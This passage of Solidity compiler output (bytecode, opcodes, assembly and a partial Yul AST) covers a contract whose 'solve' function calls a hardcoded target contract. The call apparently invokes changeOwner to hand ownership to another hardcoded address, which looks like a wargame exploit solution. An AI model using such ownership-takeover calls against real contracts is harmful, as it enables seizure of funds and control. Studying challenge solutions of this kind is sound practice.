\"#utility.yul\":3370:3375   */\n      dup2\n        /* \"#utility.yul\":3359:3375   */\n      swap1\n      pop\n        /* \"#utility.yul\":3303:3381   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3387:3481   */\n    tag_69:\n        /* \"#utility.yul\":3426:3433   */\n      0x00\n        /* \"#utility.yul\":3455:3475   */\n      tag_72\n        /* \"#utility.yul\":3469:3474   */\n      dup3\n        /* \"#utility.yul\":3455:3475   */\n      tag_73\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":3444:3475   */\n      swap1\n      pop\n        /* \"#utility.yul\":3387:3481   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3487:3589   */\n    tag_40:\n        /* \"#utility.yul\":3528:3534   */\n      0x00\n        /* \"#utility.yul\":3579:3581   */\n      0x1f\n        /* \"#utility.yul\":3575:3582   */\n      not\n        /* \"#utility.yul\":3570:3572   */\n      0x1f\n        /* \"#utility.yul\":3563:3568   */\n      dup4\n        /* \"#utility.yul\":3559:3573   */\n      add\n        /* \"#utility.yul\":3555:3583   */\n      and\n        /* \"#utility.yul\":3545:3583   */\n      swap1\n      pop\n        /* \"#utility.yul\":3487:3589   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3595:3689   */\n    tag_73:\n        /* \"#utility.yul\":3628:3636   */\n      0x00\n        /* \"#utility.yul\":3676:3681   */\n      dup2\n        /* \"#utility.yul\":3672:3674   */\n      0x60\n        /* \"#utility.yul\":3668:3682   */\n      shl\n        /* \"#utility.yul\":3647:3682   */\n      swap1\n      pop\n        /* \"#utility.yul\":3595:3689   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220b54797e941864c96c82812279e4db62520f1f44501eaa6b1ede40ea9021aef0564736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5061037f806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063890d690814610030575b600080fd5b61003861004e565b6040516100459190610223565b60405180910390f35b606060007303cbed7039bda6ae4523c6e7bb6579718a584f8390506000808273ffffffffffffffffffffffffffffffffffffffff165a7fa6f9dae13f6f9f7de69814715796059e291f78e951670d244dd3b07111b8bb1873798349e06c67272465123b91bd88c5d19b8c78786040516020016100cb9291906101e0565b6040516020818303038152906040526040516100e7919061020c565b60006040518083038160008787f1925050503d8060008114610125576040519150601f19603f3d011682016040523d82523d6000602084013e61012a565b606091505b5091509150811561014057809350505050610145565b600080fd5b90565b6101596101548261026c565b6102fd565b82525050565b61017061016b8261027e565b61030f565b82525050565b600061018182610245565b61018b8185610250565b935061019b8185602086016102ca565b6101a48161032b565b840191505092915050565b60006101ba82610245565b6101c48185610261565b93506101d48185602086016102ca565b80840191505092915050565b60006101ec828561015f565b6004820191506101fc8284610148565b6014820191508190509392505050565b600061021882846101af565b915081905092915050565b6000602082019050818103600083015261023d8184610176565b905092915050565b600081519050919050565b600082825260208201905092915050565b600081905092915050565b6000610277826102aa565b9050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b838110156102e85780820151818401526020810190506102cd565b838111156102f7576000848401525b50505050565b600061030882610319565b9050919050565b6000819050919050565b60006103248261033c565b9050919050565b6000601f19601f8301169050919050565b60008160601b905091905056fea2646970667358221220b54797e941864c96c82812279e4db62520f1f44501eaa6b1ede40ea9021aef0564736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x37F DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x223 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH20 0x3CBED7039BDA6AE4523C6E7BB6579718A584F83 SWAP1 POP PUSH1 0x0 DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GAS PUSH32 0xA6F9DAE13F6F9F7DE69814715796059E291F78E951670D244DD3B07111B8BB18 PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0xCB SWAP3 SWAP2 SWAP1 PUSH2 0x1E0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0xE7 SWAP2 SWAP1 PUSH2 0x20C JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x125 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x12A JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 ISZERO PUSH2 0x140 JUMPI DUP1 SWAP4 POP POP POP POP PUSH2 0x145 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x159 PUSH2 0x154 DUP3 PUSH2 0x26C JUMP JUMPDEST PUSH2 0x2FD JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x170 PUSH2 0x16B DUP3 PUSH2 0x27E JUMP JUMPDEST PUSH2 0x30F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x181 DUP3 PUSH2 0x245 JUMP JUMPDEST PUSH2 0x18B DUP2 DUP6 PUSH2 0x250 JUMP JUMPDEST SWAP4 POP PUSH2 0x19B DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2CA JUMP JUMPDEST PUSH2 0x1A4 DUP2 PUSH2 0x32B JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BA DUP3 PUSH2 0x245 JUMP JUMPDEST PUSH2 0x1C4 DUP2 DUP6 PUSH2 0x261 JUMP JUMPDEST SWAP4 POP PUSH2 0x1D4 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2CA JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EC DUP3 DUP6 PUSH2 0x15F JUMP JUMPDEST PUSH1 0x4 DUP3 ADD SWAP2 POP PUSH2 0x1FC DUP3 DUP5 PUSH2 0x148 JUMP JUMPDEST PUSH1 0x14 DUP3 ADD SWAP2 POP DUP2 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x218 DUP3 DUP5 PUSH2 0x1AF JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x23D DUP2 DUP5 PUSH2 0x176 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x277 DUP3 PUSH2 0x2AA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2E8 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2CD JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x2F7 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x308 DUP3 PUSH2 0x319 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x324 DUP3 PUSH2 0x33C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x60 SHL SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB5 SELFBALANCE SWAP8 0xE9 COINBASE DUP7 0x4C SWAP7 0xC8 0x28 SLT 0x27 SWAP15 0x4D 0xB6 0x25 KECCAK256 CALL DELEGATECALL GASLIMIT ADD 0xEA 0xA6 0xB1 0xED 0xE4 0xE 0xA9 MUL BYTE 0xEF SDIV PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER ",
							"sourceMap": "294:523:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@solve_76": {
									"entryPoint": 78,
									"id": 76,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"abi_encode_t_address_to_t_address_nonPadded_inplace_fromStack": {
									"entryPoint": 328,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes4_to_t_bytes4_nonPadded_inplace_fromStack": {
									"entryPoint": 351,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack": {
									"entryPoint": 374,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 431,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_bytes4_t_address__to_t_bytes4_t_address__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 480,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 524,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_bytes_memory_ptr__to_t_bytes_memory_ptr__fromStack_reversed": {
									"entryPoint": 547,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_length_t_bytes_memory_ptr": {
									"entryPoint": 581,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack": {
									"entryPoint": 592,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 609,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 620,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_bytes4": {
									"entryPoint": 638,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 682,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_memory_to_memory": {
									"entryPoint": 714,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"leftAlign_t_address": {
									"entryPoint": 765,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"leftAlign_t_bytes4": {
									"entryPoint": 783,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"leftAlign_t_uint160": {
									"entryPoint": 793,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"round_up_to_mul_of_32": {
									"entryPoint": 811,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"shift_left_96": {
									"entryPoint": 828,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:3692:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "90:74:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "107:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "150:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "132:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "132:24:1"
																			}
																		],
																		"functionName": {
																			"name": "leftAlign_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "112:19:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "112:45:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "100:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "100:58:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "100:58:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "78:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "85:3:1",
														"type": ""
													}
												],
												"src": "7:157:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "251:72:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "268:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "309:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bytes4",
																					"nodeType": "YulIdentifier",
																					"src": "292:16:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "292:23:1"
																			}
																		],
																		"functionName": {
																			"name": "leftAlign_t_bytes4",
																			"nodeType": "YulIdentifier",
																			"src": "273:18:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "273:43:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "261:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "261:56:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "261:56:1"
														}
													]
												},
												"name": "abi_encode_t_bytes4_to_t_bytes4_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "239:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "246:3:1",
														"type": ""
													}
												],
												"src": "170:153:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "419:270:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "429:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "475:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "443:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "443:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "433:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "490:77:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "555:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "560:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "497:57:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "497:70:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "490:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "602:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "609:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "598:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "598:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "616:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "621:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory",
																	"nodeType": "YulIdentifier",
																	"src": "576:21:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "576:52:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "576:52:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "637:46:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "648:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "675:6:1"
																			}
																		],
																		"functionName": {
																			"name": "round_up_to_mul_of_32",
																			"nodeType": "YulIdentifier",
																			"src": "653:21:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "653:29:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "644:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "644:39:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "637:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "400:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "407:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "415:3:1",
														"type": ""
													}
												],
												"src": "329:360:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "803:265:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "813:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "859:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "827:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "827:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "817:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "874:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "957:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "962:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "881:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "881:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "874:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1004:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1011:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1000:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1000:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1018:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1023:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory",
																	"nodeType": "YulIdentifier",
																	"src": "978:21:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "978:52:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "978:52:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1039:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1050:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1055:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1046:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1046:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1039:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "784:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "791:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "799:3:1",
														"type": ""
													}
												],
												"src": "695:373:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1216:250:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1287:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1296:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes4_to_t_bytes4_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1227:59:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1227:73:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1227:73:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1309:18:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1320:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1325:1:1",
																		"type": "",
																		"value": "4"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1316:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1316:11:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1309:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "1399:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1408:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1337:61:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1337:75:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1337:75:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1421:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1432:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1437:2:1",
																		"type": "",
																		"value": "20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1428:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1428:12:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1421:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1450:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1457:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1450:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes4_t_address__to_t_bytes4_t_address__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1187:3:1",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "1193:6:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1201:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1212:3:1",
														"type": ""
													}
												],
												"src": "1074:392:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1606:137:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1617:100:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1704:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1713:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1624:79:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1624:93:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1617:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1727:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1734:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1727:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1585:3:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1591:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1602:3:1",
														"type": ""
													}
												],
												"src": "1472:271:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1865:193:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1875:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1887:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1898:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1883:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1883:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1875:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1922:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1933:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
